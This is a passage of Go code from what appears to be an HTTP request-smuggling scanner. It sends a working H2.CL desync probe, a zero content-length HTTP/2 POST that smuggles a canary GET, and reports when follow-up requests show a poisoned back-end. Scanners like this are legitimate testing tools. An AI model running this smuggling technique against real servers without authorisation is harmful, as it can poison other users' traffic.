	// The trailing incomplete header "Foo: " absorbs the next real request's
	// first line, preventing the back-end from seeing a double request-line.
	smuggled := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nFoo: ", canaryPath, host)

	// Send the H2.CL attack: CL=0 but DATA frame has the smuggled request
	extraHeaders := map[string]string{"content-length": "0"}

	// Repeat the attack several times — the front-end may not reuse the same
	// back-end connection on the first attempt.
	for attempt := 0; attempt < cfg.Attempts; attempt++ {
		attackCfg := cfg.WithDebugScope(fmt.Sprintf("attempt=%d.attack", attempt))
		_, err := h2RawRequest(target, "POST", path, host, smuggled, extraHeaders, attackCfg)
		if err != nil {
			rep.Log("H2.CL smuggle attack send error: %v", err)
			continue
		}

		// Send follow-up via H2 to detect poisoning
		followupCfg := cfg.WithDebugScope(fmt.Sprintf("attempt=%d.followup.h2", attempt))
		followup, err := h2RawRequest(target, "GET", path, host, "", nil, followupCfg)
		if err != nil {
			continue
		}
		dbg(cfg, "attempt=%d followup h2 status=%d baseline=%d poisoned=%v",
			attempt, followup.Status, baseline.Status,
			h2CLPoisonDetected(baseline, followup, canaryPath))

		// Detection signals:
		//   1. Follow-up got 404 (from smuggled GET /canary) when baseline was not 404
		//   2. Follow-up body contains the canary path (error page reflecting the path)
		//   3. Follow-up status differs from baseline in a way consistent with smuggling
		if h2CLPoisonDetected(baseline, followup, canaryPath) {
			probe := fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\ncontent-length: 0\r\n\r\n%s", path, host, smuggled)
			rep.Emit(report.Finding{
				Target:   target.String(),
				Method:   "HTTP/2",
				Severity: report.SeverityConfirmed,
				Type:     "H2.CL",
				Technique: "H2.CL-zero-smuggle",
				Description: fmt.Sprintf(
					"H2.CL desync confirmed: H2 POST with content-length: 0 smuggled a request to %s. "+
						"Follow-up request (attempt %d) received status %d instead of baseline %d. "+
						"The H2 front-end ignored CL and forwarded the DATA frame body; "+
						"the H1 back-end read CL=0 and treated the body as a new request.",
					canaryPath, attempt, followup.Status, baseline.Status),
				Evidence: fmt.Sprintf(
					"baseline_status=%d followup_status=%d canary=%s attempt=%d",
					baseline.Status, followup.Status, canaryPath, attempt),
				RawProbe: probe,
			})
			return
		}

		// Also try follow-up via H1 — may hit the same back-end connection pool
		h1Req := []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host))
		h1Resp, _, _, h1Err := request.RawRequest(target, h1Req, cfg)
		if h1Err == nil && len(h1Resp) > 0 {
			h1Status := request.StatusCode(h1Resp)
			if (h1Status == 404 && baseline.Status != 404) ||
				request.ContainsStr(h1Resp, canaryPath) {
				probe := fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\ncontent-length: 0\r\n\r\n%s", path, host, smuggled)
				rep.Emit(report.Finding{
					Target:   target.String(),
					Method:   "HTTP/2",
					Severity: report.SeverityConfirmed,
					Type:     "H2.CL",
					Technique: "H2.CL-zero-smuggle",
					Description: fmt.Sprintf(
						"H2.CL desync confirmed via H1 follow-up: smuggled request to %s "+
							"poisoned the back-end connection pool. Follow-up H1 request "+
							"(attempt %d) received status %d instead of baseline %d.",
						canaryPath, attempt, h1Status, baseline.Status),
					Evidence: fmt.Sprintf(
						"baseline_status=%d h1_followup_status=%d canary=%s attempt=%d",
						baseline.Status, h1Status, canaryPath, attempt),
					RawProbe: probe,
				})
				if cfg.ExitOnFind {
					return
				}
			}
		}
	}
}

// h2CLPoisonDetected checks whether a follow-up H2 response shows signs of
// receiving the smuggled canary response instead of its own.
func h2CLPoisonDetected(baseline, followup *h2Response, canaryPath string) bool {
	if followup == nil || followup.Status == 0 {
		return false
	}
	// Follow-up got 404 when baseline was not 404 → likely the canary path response
	if followup.Status == 404 && baseline.Status != 404 {
		return true
	}
	// Canary path appears in the follow-up response body (error page reflection)
	if request.ContainsStr(followup.Body, canaryPath) {
		return true
	}
	// Follow-up got "not found" / "Unrecognized" when baseline was 2xx
	if baseline.Status >= 200 && baseline.Status < 300 {
		if followup.Status == 405 || followup.Status == 400 {
			if h2BodySuspicious(followup.Body) {
				return true
			}
		}
	}
	return false
}
